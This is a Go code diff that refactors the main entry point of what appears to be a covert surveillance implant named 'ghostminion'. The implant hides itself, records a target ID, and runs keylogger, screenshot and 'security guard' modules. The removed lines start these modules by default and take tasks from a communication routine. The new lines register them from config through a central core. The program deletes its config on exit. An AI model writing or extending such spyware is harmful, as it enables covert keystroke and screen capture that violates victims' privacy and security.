@@ -2,8 +2,8 @@ package main
 
 import (
 	"ghostminion/apps"
-	"ghostminion/communication"
 	"ghostminion/config"
+	"ghostminion/core"
 	"ghostminion/db"
 	"ghostminion/hider"
 	"ghostminion/logger"
@@ -11,26 +11,21 @@ import (
 )
 
 var (
-	configInstance = config.GetInstance()
-	_              = db.GetInstance()
-	lgr            = logger.GetInstance()
+	cfg = config.GetInstance()
+	_   = db.GetInstance()
+	lgr = logger.GetInstance()
 )
 
 func main() {
-
-	defer func() {
-		err := config.DeleteConfig()
-		if err != nil {
-			lgr.Error("couldn't delete config file", err)
-		}
-	}()
-
+	defer config.DeleteConfig()
 	defer lgr.Close()
 
-	hider.Hide()
+	if err := hider.Hide(); err != nil {
+		return
+	}
 
 	targetId := persistence.GeTargetID()
-	err := configInstance.Update(func(c *config.Config) {
+	err := cfg.Update(func(c *config.Config) {
 		c.AgentID = targetId
 	})
 	if err != nil {
@@ -39,40 +34,23 @@ func main() {
 
 	lgr.Debug("targetId: %s", targetId)
 
-	appManager := apps.GetAppManagerInstance()
-	addApps(appManager)
-
-	taskCh := make(chan apps.AppData)
-	go communication.Routine(taskCh)
-	// TODO: should be done in the task/app manager
-	for task := range taskCh {
-		// TODO: handle config change
-		if app, err := apps.NewAppFactory(task); err != nil {
-			lgr.Warn("could not make app from task err: %s", err.Error())
-		} else {
-			appManager.StartApp(task.Name, app)
-		}
-	}
-
-	appManager.StopAll()
+	appCore := core.GetInstance()
+	RegisterDefaultApps(appCore)
+	appCore.Start() // todo: should run security here
 }
 
-func addApps(appManager *apps.AppManager) {
-	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
-
-	app, err := apps.NewScreenshotApp(
-		configInstance.Apps.Screenshot["Interval"].(int),
-		configInstance.Apps.Screenshot["Quality"].(int),
-	)
-	if app != nil {
-		appManager.StartApp(string(apps.ScreenShotTask)+"_default", app)
-	} else if err != nil {
-		lgr.Error("Error creating screenshot app err: %s", err.Error())
+func RegisterDefaultApps(core *core.Core) {
+	am := core.AppsManager()
+	for _, appConfig := range cfg.Apps {
+		app, err := apps.NewAppFactory(apps.AppData{
+			Id:     appConfig.Id,
+			Name:   appConfig.Name,
+			Type:   apps.AppType(appConfig.Type),
+			Params: appConfig.Params,
+		})
+		if err != nil {
+			return
+		}
+		am.Register(app)
 	}
-
-	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
-		FilesExistence: []string{
-			configInstance.Installation.DBPath,
-		},
-	})
 }
